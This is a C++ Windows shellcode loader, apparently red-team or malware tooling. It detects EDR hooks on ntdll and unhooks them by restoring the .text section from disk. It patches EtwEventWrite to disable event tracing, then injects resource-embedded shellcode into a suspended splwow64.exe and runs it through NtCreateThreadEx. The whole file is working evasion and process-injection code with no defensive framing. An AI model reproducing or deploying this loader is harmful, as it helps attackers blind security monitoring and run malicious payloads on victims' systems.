#include"..\public.hpp"
#include <iostream>
#include <Windows.h>
#include <dbghelp.h>
#include <psapi.h>
#include <TlHelp32.h>
#include <cstdlib>
#include <winternl.h>
#define _CRT_SECURE_NO_WARNINGS

using namespace std;

BOOL isItHooked(LPVOID addr)
{
	BYTE stub[] = "\x4c\x8b\xd1\xb8";
	std::string charData = (char*)addr;

	if (memcmp(addr, stub, 4) != 0)
	{
		for (int i = 0; i < 4; i++)
		{
			BYTE currentByte = charData[i];
		}
		return TRUE;
	}
	return FALSE;
}

//int main()
int APIENTRY wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPWSTR    lpCmdLine, _In_ int       nCmdShow)
{    
	//1.Get shellcode and shellcodesize from Resource by ID
	UINT shellcodeSize = 0;
	unsigned char *shellcode = GetShellcodeFromRes(100, shellcodeSize);
	if (shellcode == nullptr)
	{
		return 0;
	}

	int nbHooks = 0;
	if (isItHooked(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory")))
	{
		nbHooks++;
	}
	if (isItHooked(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtProtectVirtualMemory")))
	{
		nbHooks++;
	}
	if (isItHooked(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateThreadEx")))
	{
		nbHooks++;
	}
	if (isItHooked(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory")))
	{
		nbHooks++;
	}

	if (nbHooks > 0)
	{
		char path[] = { 'C',':','\\','W','i','n','d','o','w','s','\\','S','y','s','t','e','m','3','2','\\','n','t','d','l','l','.','d','l','l',0 };
		char sntdll[] = { '.','t','e','x','t',0 };
		HANDLE process = GetCurrentProcess();
		MODULEINFO mi = {};
		HMODULE ntdllModule = GetModuleHandleA("ntdll.dll");
		GetModuleInformation(process, ntdllModule, &mi, sizeof(mi));
		LPVOID ntdllBase = (LPVOID)mi.lpBaseOfDll;
		HANDLE ntdllFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
		HANDLE ntdllMapping = CreateFileMapping(ntdllFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
		LPVOID ntdllMappingAddress = MapViewOfFile(ntdllMapping, FILE_MAP_READ, 0, 0, 0);
		PIMAGE_DOS_HEADER hookedDosHeader = (PIMAGE_DOS_HEADER)ntdllBase;
		PIMAGE_NT_HEADERS hookedNtHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)ntdllBase + hookedDosHeader->e_lfanew);
		for (WORD i = 0; i < hookedNtHeader->FileHeader.NumberOfSections; i++)
		{
			PIMAGE_SECTION_HEADER hookedSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(hookedNtHeader) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));
			if (!strcmp((char*)hookedSectionHeader->Name, (char*)sntdll))
			{
				DWORD oldProtection = 0;
				bool isProtected = VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtection);
				memcpy((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), (LPVOID)((DWORD_PTR)ntdllMappingAddress + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize);
				isProtected = VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, oldProtection, &oldProtection);
			}
		}

		if (isItHooked(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory")))
		{
			nbHooks++;
		}

		if (isItHooked(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtProtectVirtualMemory")))
		{
			nbHooks++;
		}
		if (isItHooked(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateThreadEx")))
		{
			nbHooks++;
		}
		if (isItHooked(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory")))
		{
			nbHooks++;
		}
	}

	// Redefine Nt functions
	typedef LPVOID(NTAPI* uNtAllocateVirtualMemory)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
	typedef NTSTATUS(NTAPI* uNtWriteVirtualMemory)(HANDLE, PVOID, PVOID, ULONG, PULONG);
	typedef NTSTATUS(NTAPI* uNtCreateThreadEx) (OUT PHANDLE hThread, IN ACCESS_MASK DesiredAccess, IN PVOID ObjectAttributes, IN HANDLE ProcessHandle, IN PVOID lpStartAddress, IN PVOID lpParameter, IN ULONG Flags, IN SIZE_T StackZeroBits, IN SIZE_T SizeOfStackCommit, IN SIZE_T SizeOfStackReserve, OUT PVOID lpBytesBuffer);
	typedef NTSTATUS(NTAPI* uNtProtectVirtualMemory) (HANDLE, IN OUT PVOID*, IN OUT PSIZE_T, IN ULONG, OUT PULONG);
	typedef NTSTATUS(NTAPI* uNtResumeThread)(HANDLE ThreadHandle, PULONG SuspendCount);

	HINSTANCE hNtdll = GetModuleHandleA("ntdll.dll");
	uNtAllocateVirtualMemory pNtAllocateVirtualMemory = (uNtAllocateVirtualMemory)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
	uNtWriteVirtualMemory pNtWriteVirtualMemory = (uNtWriteVirtualMemory)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
	uNtProtectVirtualMemory pNtProtectVirtualMemory = (uNtProtectVirtualMemory)GetProcAddress(hNtdll, "NtProtectVirtualMemory");
	uNtCreateThreadEx pNtCreateThreadEx = (uNtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");
	uNtResumeThread pNtResumeThread = (uNtResumeThread)GetProcAddress(hNtdll, "NtResumeThread");

	//Patch ETW
	void* etwAddr = GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite");
	unsigned char etwPatch[] = { 0xC3 };
	DWORD lpflOldProtect = 0;
	unsigned __int64 memPage = 0x1000;
	void* etwAddr_bk = etwAddr;
	pNtProtectVirtualMemory(GetCurrentProcess(), (PVOID*)&etwAddr_bk, (PSIZE_T)&memPage, 0x04, &lpflOldProtect);
	pNtWriteVirtualMemory(GetCurrentProcess(), (LPVOID)etwAddr, (PVOID)etwPatch, sizeof(etwPatch), (PULONG)nullptr);
	pNtProtectVirtualMemory(GetCurrentProcess(), (PVOID*)&etwAddr_bk, (PSIZE_T)&memPage, lpflOldProtect, &lpflOldProtect);

	STARTUPINFOEXA si;
	PROCESS_INFORMATION pi;
	SIZE_T attributeSize;
	memset(&si, 0, sizeof(STARTUPINFOEXA));
	si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
	CreateProcessA(0, (LPSTR)"C:\\Windows\\splwow64.exe", 0, 0, 0, CREATE_SUSPENDED, 0, 0, &si.StartupInfo, &pi);

	SIZE_T dwSize = shellcodeSize;
	PVOID NTAlloc = NULL;
	pNtAllocateVirtualMemory(pi.hProcess, &NTAlloc, 0, &dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	ULONG bytesWritten = 0;
	pNtWriteVirtualMemory(pi.hProcess, NTAlloc, shellcode, shellcodeSize, &bytesWritten);

	DWORD OldProtect = 0;
	pNtProtectVirtualMemory(pi.hProcess, &NTAlloc, (PSIZE_T)&shellcodeSize, PAGE_EXECUTE_READ, &OldProtect);

	HANDLE remoteThreadHandle;
	pNtCreateThreadEx(&remoteThreadHandle, 0x1FFFFF, NULL, pi.hProcess, NTAlloc, NULL, FALSE, NULL, NULL, NULL, NULL);

	ULONG suspendCount = 0;
	pNtResumeThread(pi.hThread, &suspendCount);
	
    return 0;
}